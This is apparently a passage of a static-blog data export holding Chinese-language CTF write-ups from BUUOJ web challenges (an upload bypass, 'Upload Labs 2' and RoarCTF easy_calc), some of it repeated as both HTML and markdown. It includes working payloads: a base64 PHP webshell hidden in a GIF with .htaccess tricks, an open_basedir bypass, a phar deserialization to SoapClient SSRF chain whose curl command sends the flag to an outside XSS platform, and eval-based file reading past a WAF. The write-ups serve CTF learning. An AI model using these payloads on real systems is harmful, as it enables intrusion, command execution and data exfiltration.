$path);</span><br><span class=\"line\">        print_r($path);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>strrpos(要被检查的字符串,要搜索的字符串) :返回文件最后出现的位置</p>\n<p>mb_strpos(要被检查的字符串,要搜索的字符串)：返回要查找的字符串在别一个字符串中首次出现的位置</p>\n<p>此函数大致意思是文件内容不能包含&lt;?，上传的文件要经过exif_imagetype（）检测</p>\n<p>使用payload上传文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?_&#x3D;$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%ff&#125;();&amp;%ff&#x3D;get_the_flag</span><br></pre></td></tr></table></figure>\n\n<p>.htaccess</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#define height 12</span><br><span class=\"line\">#define width 12</span><br><span class=\"line\">AddType application&#x2F;x-httpd-php .cc</span><br><span class=\"line\">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;1.cc&quot;</span><br></pre></td></tr></table></figure>\n\n<p>1.cc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GIF89a00PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>\n\n<p>GIF89a与后面加密过的一句话不能使用空格或者回车隔开,因为base64解密文件时会出错，00可以修改为base64中允许出现的任意两个字符，此服务器版本为7.0+无法使用JS写法绕过&lt;?</p>\n<p><a href=\"https://www.cnblogs.com/cimuhuashuimu/p/11544487.html\" target=\"_blank\" rel=\"noopener\">绕过open_basedir参考文章</a></p>\n<p>绕过payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);echo(file_get_contents(&#39;flag&#39;));&#96;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>先扫描目录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;upload&#x2F;tmp_2c67ca1eaeadbdc1868d67003072b481&#x2F;1.cc</span><br></pre></td></tr></table></figure>\n\n<p>post内容</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cmd&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(scandir(&#39;&#x2F;&#39;));</span><br></pre></td></tr></table></figure>\n\n<p>返回内容</p>\n<p><img src=\"/pic/72.png\" alt=\"\"></p>\n<p>找到flag，读取flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cmd&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(file(&#39;&#x2F;THis_Is_tHe_F14g&#39;));</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pic/73.png\" alt=\"\"></p>\n<h2 id=\"Upload-Labs-2\"><a href=\"#Upload-Labs-2\" class=\"headerlink\" title=\"Upload Labs 2\"></a>Upload Labs 2</h2><p>给出了源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//admin.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">'config.php'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Ad</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $cmd;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $clazz;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $func1;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $func2;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $func3;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $instance;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $arg1;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $arg2;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $arg3;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3)</span></span>&#123;  <span class=\"comment\">//构造类时调用的方法</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;cmd = $cmd;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;clazz = $clazz;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;func1 = $func1;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;func2 = $func2;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;func3 = $func3;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;arg1 = $arg1;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;arg2 = $arg2;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;arg3 = $arg3;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        $reflect = <span class=\"keyword\">new</span> ReflectionClass(<span class=\"keyword\">$this</span>-&gt;clazz);</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;instance = $reflect-&gt;newInstanceArgs();  <span class=\"comment\">//实例化clazz类</span></span><br><span class=\"line\"></span><br><span class=\"line\">        $reflectionMethod = <span class=\"keyword\">new</span> ReflectionMethod(<span class=\"keyword\">$this</span>-&gt;clazz, <span class=\"keyword\">$this</span>-&gt;func1);</span><br><span class=\"line\">        $reflectionMethod-&gt;invoke(<span class=\"keyword\">$this</span>-&gt;instance, <span class=\"keyword\">$this</span>-&gt;arg1); <span class=\"comment\">//执行clazz中的func1方法，参数为arg1</span></span><br><span class=\"line\"></span><br><span class=\"line\">        $reflectionMethod = <span class=\"keyword\">new</span> ReflectionMethod(<span class=\"keyword\">$this</span>-&gt;clazz, <span class=\"keyword\">$this</span>-&gt;func2);</span><br><span class=\"line\">        $reflectionMethod-&gt;invoke(<span class=\"keyword\">$this</span>-&gt;instance, <span class=\"keyword\">$this</span>-&gt;arg2);<span class=\"comment\">//执行clazz中的func2方法，参数为arg2</span></span><br><span class=\"line\"></span><br><span class=\"line\">        $reflectionMethod = <span class=\"keyword\">new</span> ReflectionMethod(<span class=\"keyword\">$this</span>-&gt;clazz, <span class=\"keyword\">$this</span>-&gt;func3);</span><br><span class=\"line\">        $reflectionMethod-&gt;invoke(<span class=\"keyword\">$this</span>-&gt;instance, <span class=\"keyword\">$this</span>-&gt;arg3);</span><br><span class=\"line\">    &#125; <span class=\"comment\">//执行clazz中的func3方法，参数为arg3</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span></span>&#123;  <span class=\"comment\">//析构类调用的方法</span></span><br><span class=\"line\">        system(<span class=\"keyword\">$this</span>-&gt;cmd);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>($_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>] == <span class=\"string\">'127.0.0.1'</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'admin'</span>]))&#123;</span><br><span class=\"line\">        $cmd = $_POST[<span class=\"string\">'cmd'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">        $clazz = $_POST[<span class=\"string\">'clazz'</span>];</span><br><span class=\"line\">        $func1 = $_POST[<span class=\"string\">'func1'</span>];</span><br><span class=\"line\">        $func2 = $_POST[<span class=\"string\">'func2'</span>];</span><br><span class=\"line\">        $func3 = $_POST[<span class=\"string\">'func3'</span>];</span><br><span class=\"line\">        $arg1 = $_POST[<span class=\"string\">'arg1'</span>];</span><br><span class=\"line\">        $arg2 = $_POST[<span class=\"string\">'arg2'</span>];</span><br><span class=\"line\">        $arg2 = $_POST[<span class=\"string\">'arg3'</span>];</span><br><span class=\"line\">        $admin = <span class=\"keyword\">new</span> Ad($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);</span><br><span class=\"line\">        $admin-&gt;check();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"You r not admin!\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://www.jianshu.com/p/d02cbde1cdd7\" target=\"_blank\" rel=\"noopener\">关于PHP反射类</a></p>\n<p>大致意思就是要构造ssrf进行命令执行。SoapClient可以构造http请求。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// func.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">'class.php'</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">\"submit\"</span>]) &amp;&amp; <span class=\"keyword\">isset</span>($_POST[<span class=\"string\">\"url\"</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\\\s)*|(.|\\\\s)*(file|data|\\.\\.)(.|\\\\s)*/i'</span>,$_POST[<span class=\"string\">'url'</span>]))&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"Go away!\"</span>);</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        $file_path = $_POST[<span class=\"string\">'url'</span>];</span><br><span class=\"line\">        $file = <span class=\"keyword\">new</span> File($file_path);</span><br><span class=\"line\">        $file-&gt;getMIME();</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;p&gt;Your file type is '$file' &lt;/p&gt;\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>传入的url要经过正则匹配，调用file类</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// class.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">'config.php'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">File</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $file_name;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $type;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $func = <span class=\"string\">\"Check\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($file_name)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;file_name = $file_name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        $class = <span class=\"keyword\">new</span> ReflectionClass(<span class=\"keyword\">$this</span>-&gt;func);</span><br><span class=\"line\">        $a = $class-&gt;newInstanceArgs(<span class=\"keyword\">$this</span>-&gt;file_name);</span><br><span class=\"line\">        $a-&gt;check();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getMIME</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;type = finfo_file($finfo, <span class=\"keyword\">$this</span>-&gt;file_name);</span><br><span class=\"line\">        finfo_close($finfo);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;type;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Check</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $file_name;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($file_name)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;file_name = $file_name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        $data = file_get_contents(<span class=\"keyword\">$this</span>-&gt;file_name);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (mb_strpos($data, <span class=\"string\">\"&lt;?\"</span>) !== <span class=\"keyword\">FALSE</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">\"&amp;lt;? in contents!\"</span>);  <span class=\"comment\">//不能包含<span class=\"meta\">&lt;?</span></span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://www.w3school.com.cn/media/media_mimeref.asp\" target=\"_blank\" rel=\"noopener\">关于MME类型文件</a>   上传的文件要绕过Check::check()</p>\n<p>finfo_file会触发phar的反序列化<a href=\"https://paper.seebug.org/680/\" target=\"_blank\" rel=\"noopener\">参考文章1</a>     <a href=\"https://xz.aliyun.com/t/2958\" target=\"_blank\" rel=\"noopener\">参考文章2</a></p>\n<p>传入成功后url</p>\n<p>phar://开头被正则过滤，可以使用</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php:&#x2F;&#x2F;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;phar:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n\n<p>生成phar文件</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">File</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $file_name = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $func = <span class=\"string\">\"SoapClient\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        $target = <span class=\"string\">\"http://127.0.0.1/admin.php\"</span>;</span><br><span class=\"line\">        $post_string = <span class=\"string\">'admin=1&amp;cmd=curl --referer \"`/readflag`\" --insecure \"http://xss.buuoj.cn/index.php?do=api%26id=dzWPkK\"&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3='</span>. <span class=\"string\">\"\\r\\n\"</span>;</span><br><span class=\"line\">        $headers = [];</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;file_name  = [</span><br><span class=\"line\">            <span class=\"keyword\">null</span>,</span><br><span class=\"line\">            <span class=\"keyword\">array</span>(<span class=\"string\">'location'</span> =&gt; $target,</span><br><span class=\"line\">                <span class=\"string\">'user_agent'</span>=&gt; str_replace(<span class=\"string\">'^^'</span>, <span class=\"string\">\"\\r\\n\"</span>, <span class=\"string\">'xxxxx^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class=\"string\">'^^'</span>,$headers).<span class=\"string\">'Content-Length: '</span>. (string)strlen($post_string).<span class=\"string\">'^^^^'</span>.$post_string),</span><br><span class=\"line\">                <span class=\"string\">'uri'</span>=&gt;<span class=\"string\">'hello'</span>)</span><br><span class=\"line\">        ];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$obj = <span class=\"keyword\">new</span> File();</span><br><span class=\"line\">$phar = <span class=\"keyword\">new</span> Phar(<span class=\"string\">'poc.phar'</span>);</span><br><span class=\"line\">$phar-&gt;startBuffering();</span><br><span class=\"line\">$phar-&gt;setStub(<span class=\"string\">\"GIF89a __HALT_COMPILER();\"</span>);</span><br><span class=\"line\">$phar-&gt;setMetadata($obj);</span><br><span class=\"line\">$phar-&gt;addFromString(<span class=\"string\">'1.txt'</span>,<span class=\"string\">'text'</span>);</span><br><span class=\"line\">$phar-&gt;stopBuffering();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>将生成的poc.phar改一个图片文件后缀，然后上传</p>\n<p>再func.php里面提交url</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;phar:&#x2F;&#x2F;upload&#x2F;2c67ca1eaeadbdc1868d67003072b481&#x2F;551ccbaef945b2c4f3ca88361f08d600.jpg</span><br></pre></td></tr></table></figure>\n\n<p>关于构造SoapClient当中的cmd命令为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl --referer &quot;&#96;&#x2F;readflag&#96;&quot; --insecure &quot;http:&#x2F;&#x2F;xss.buuoj.cn&#x2F;index.php?do&#x3D;api%26id&#x3D;dzWPkK&quot;</span><br></pre></td></tr></table></figure>\n\n<p>因为没有回显，只能使用将flag外带的方式带出来，使用buuoj的xss平台。id后面的字符是你创建的工程的数值</p>\n<p>附上出题人<a href=\"https://xz.aliyun.com/t/6057\" target=\"_blank\" rel=\"noopener\">出题笔记</a></p>"},{"title":"buuoj刷题记录2","date":"2019-12-26T12:16:12.000Z","_content":"\n## [Roarctf]easy_calc\n\n### 0x00 基础\n\nphp内置读取文件内容函数\n\n```php\nfile_get_contents()\nreadfile()\nfile()\n```\n\n目录扫描函数\n\n```php\nscandir()\n```\n\n<!--more-->\n\n字符转换函数\n\n```php\nhex2bin(\"979797\")->\"aaa\"\nchr(95)->\"a\"\n```\n\n输出函数\n\n```php\nvar_dump()\nprintf()\n```\n\n`parse_str`函数通常被自动应用于`get`、`post`请求和`cookie`中。使用`parse_str`解析规则绕过waf\n\n### 0x01 分析\n\n查看源码，发现calc.php\n\n```php\n<script>\n    $('#calc').submit(function(){\n        $.ajax({\n            url:\"calc.php?num=\"+encodeURIComponent($(\"#content\").val()),\n            type:'GET',\n            success:function(data){\n                $(\"#result\").html(`<div class=\"alert alert-success\">\n            <strong>答案:</strong>${data}\n            </div>`);\n            },\n            error:function(){\n                alert(\"这啥?算不来!\");\n            }\n        })\n        return false;\n    })\n</script>\n```\n\n进入calc.php,进行代码审计。\n\n```php\n<?php\nerror_reporting(0);\nif(!isset($_GET['num'])){\n    show_source(__FILE__);\n}else{\n        $str = $_GET['num'];\n        $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^'];\n        foreach ($blacklist as $blackitem) {\n                if (preg_match('/' . $blackitem . '/m', $str)) {    \n                        die(\"what are you want to do?\");//如果包含黑名单中的字符，程序退出\n                }\n        }\n        eval('echo '.$str.';');\n}\n?> \n```\n\n### 0x02 开始操作\n\n传入`1+1` 显示`403 Forbidden` 传入`1%2b1`就可以。必须传入url编码后的。查看`phpinfo()`，也是`403 Forbidden`，利用PHP自动解析函数`parser_str()`绕过，详细介绍查看[参考连接](https://www.freebuf.com/articles/web/213359.html)。\n\n扫描目录使用`scandir()`因为`/ '  \"`被过滤无法直接使用`/`，使用`chr()`转换payload= `?+num=print_r(scandir(chr(47)))`\n\n```php\nArray ( [0] => . [1] => .. [2] => .dockerenv [3] => bin [4] => boot [5] => dev [6] => etc [7] => f1agg [8] => home [9] => lib [10] => lib64 [11] => media [12] => mnt [13] => opt [14] => proc [15] => root [16] => run [17] => sbin [18] => srv [19] => start.sh [20] => sys [21] => tmp [22] => usr [23] => var ) 1\n```\n\n使用PHP内置函数获`file_get_contents()`获取文件内容payload=`?+num=printf(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))`\n\n```\nflag{d09c31b7-d1a1-45a2-b35b-65452a1335ef} 43\n```\n\n","source":"_posts/buuoj刷题记录2.md","raw":"---\ntitle: buuoj刷题记录2\ndate: 2019-12-26 20:16:12\ntags:\n - ctf\n - Roarctf\n - web\n - buuctf\ncategories: \n - 刷题记录\n---\n\n## [Roarctf]easy_calc\n\n### 0x00 基础\n\nphp内置读取文件内容函数\n\n```php\nfile_get_contents()\nreadfile()\nfile()\n```\n\n目录扫描函数\n\n```php\nscandir()\n```\n\n<!--more-->\n\n字符转换函数\n\n```php\nhex2bin(\"979797\")->\"aaa\"\nchr(95)->\"a\"\n```\n\n输出函数\n\n```php\nvar_dump()\nprintf()\n```\n\n`parse_str`函数通常被自动应用于`get`、`post`请求和`cookie`中。使用`parse_str`解析规则绕过waf\n\n### 0x01 分析\n\n查看源码，发现calc.php\n\n```php\n<script>\n    $('#calc').submit(function(){\n        $.ajax({\n            url:\"calc.php?num=\"+encodeURIComponent($(\"#content\").val()),\n            type:'GET',\n            success:function(data){\n                $(\"#result\").html(`<div class=\"alert alert-success\">\n            <strong>答案:</strong>${data}\n            </div>`);\n            },\n            error:function(){\n                alert(\"这啥?算不来!\");\n            }\n        })\n        return false;\n    })\n</script>\n```\n\n进入calc.php,进行代码审计。\n\n```php\n<?php\nerror_reporting(0);\nif(!isset($_GET['num'])){\n    show_source(__FILE__);\n}else{\n        $str = $_GET['num'];\n        $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^'];\n        foreach ($blacklist as $blackitem) {\n                if (preg_match('/' . $blackitem . '/m', $str)) {    \n                        die(\"what are you want to do?\");//如果包含黑名单中的字符，程序退出\n                }\n        }\n        eval('echo '.$str.';');\n}\n?> \n```\n\n### 0x02 开始操作\n\n传入`1+1` 显示`403 Forbidden` 传入`1%2b1`就可以。必须传入url编码后的。查看`phpinfo()`，也是`403 Forbidden`，利用PHP自动解析函数`parser_str()`绕过，详细介绍查看[参考连接](https://www.freebuf.com/articles/web/213359.html)。\n\n扫描目录使用`scandir()`因为`/ '  \"`被过滤无法直接使用`/`，使用`chr()`转换payload= `?+num=print_r(scandir(chr(47)))`\n\n```php\nArray ( [0] => . [1] => .. [2] => .dockerenv [3] => bin [4] => boot [5] => dev [6] => etc [7] => f1agg [8] => home [9] => lib [10] => lib64 [11] => media [12] => mnt [13] => opt [14] => proc [15] => root [16] => run [17] => sbin [18] => srv [19] => start.sh [20] => sys [21] => tmp [22] => usr [23] => var ) 